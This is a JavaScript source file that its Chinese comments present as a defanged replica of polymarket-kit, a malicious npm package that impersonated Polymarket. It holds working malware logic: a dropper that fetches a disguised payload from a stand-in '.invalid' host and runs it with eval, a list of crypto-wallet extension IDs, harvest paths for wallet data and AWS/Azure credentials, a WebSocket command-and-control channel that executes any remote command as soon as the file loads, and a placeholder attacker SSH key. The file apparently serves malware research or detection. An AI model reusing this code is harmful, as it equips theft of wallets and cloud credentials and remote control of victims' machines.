import { exec } from "node:child_process";
import { readFileSync } from "node:fs";
import { homedir } from "node:os";
import { join } from "node:path";

/**
 * 去武器化复刻：OX Security 研究团队披露（2026-07-12）——npm 包 polymarket-kit
 * 冒充 Polymarket 预测市场，多阶段投放：从伪装成图片站点的域名下载混淆载荷并执行；
 * 收割浏览器钱包扩展（MetaMask/Phantom/TronLink 等 7 款）与桌面钱包数据、
 * 云厂商（GCP/AWS/Azure）凭据；经 WebSocket C2 常驻并具备 RAT 任意命令执行；
 * 攻击者操作失误把自己 GitLab SSH 私钥明文留在包内（「malware-slop」）。
 * 本复刻：端点替换为 *.invalid，私钥块为自行生成的无效占位（非任何真实密钥）。
 */

// —— 披露形态：攻击者把自己的 OPENSSH 私钥明文留在包内（此处为自生成占位，无法解析、无法使用）——
const ATTACKER_SSH_KEY_PLACEHOLDER = `-----BEGIN OPENSSH PRIVATE KEY-----
c3ludGhldGljLXJlcGxpY2EtcGxhY2Vob2xkZXItbm90LWEtcmVhbC1rZXktMDAwMDAw
MDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAw
MDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAw
MDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAw
-----END OPENSSH PRIVATE KEY-----`;

// —— 披露形态：多阶段 dropper——伪装图片站点下载混淆载荷并执行（端点已替换）——
async function dropStage() {
  const res = await fetch("https://cdn.svganchordev.invalid/stage2.png");
  const stage = await res.text();
  return eval(stage);
}

// —— 披露形态：收割目标（钱包扩展 ID 清单与云厂商配置目录，只保留路径/ID 形态）——
const WALLET_EXTENSIONS = [
  "nkbihfbeogaeaoehlefnkodbefgpgknn", // MetaMask
  "bfnaelmomeimhlpmgjnjophhpkkoljpa", // Phantom
  "ibnejdfjmmkpcnlpebklmnkoeoihofec", // TronLink
  "ejbalbakoplchlghecdalmeeeajnimhm", // Coinbase Wallet
  "khpkpbbcccdmmclmpigdgddabeilkdpd", // OKX Wallet
  "egjidjbpglichdcondbcbdnbeeppgdph", // Trust Wallet
  "acmacodkjbdgmoleebolmdjonilkdbch", // Rabby Wallet
];

function harvestTargets() {
  return [
    join(homedir(), ".config", "google-chrome", "Default", "Local Extension Settings"),
    join(homedir(), ".exodus"),
    join(homedir(), ".aws"),
    join(homedir(), ".azure"),
  ].map((dir) => join(dir, WALLET_EXTENSIONS[0] ?? ""));
}

// —— 披露形态：WebSocket C2 常驻 + RAT 任意命令执行（远程下发 kind=exec 即执行）——
const ws = new WebSocket("wss://c2.svganchordev.invalid/agent");
ws.onmessage = (event) => {
  const { kind, command } = JSON.parse(event.data);
  if (kind === "exec") exec(command);
};

void ATTACKER_SSH_KEY_PLACEHOLDER;
void dropStage;
void harvestTargets;
void readFileSync;
